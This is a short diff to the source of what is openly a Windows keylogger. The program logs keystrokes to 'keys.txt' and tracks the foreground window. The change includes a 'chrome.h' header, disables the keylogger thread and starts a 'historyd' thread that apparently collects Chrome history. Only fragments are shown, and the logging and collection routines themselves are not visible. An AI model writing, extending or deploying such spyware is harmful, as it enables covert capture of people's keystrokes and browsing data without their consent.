@@ -4,7 +4,7 @@
 #include <thread>
 
 #include "write.h"
-//#include "chrome.h"
+#include "chrome.h"
 // #include "capt.h"
 
 #define KFILE "keys.txt"
@@ -156,8 +156,12 @@ void klogger(){
 int main(){
     curr_window = GetForegroundWindow();
 
-    std::thread keylogger_daemon(klogger);
-    keylogger_daemon.join();
+    //std::thread klogd(klogger);
+    std::thread historyd(init_historyd);
+    
+    historyd.join();
+    //klogd.join();
+    
 
     return 0;
 }
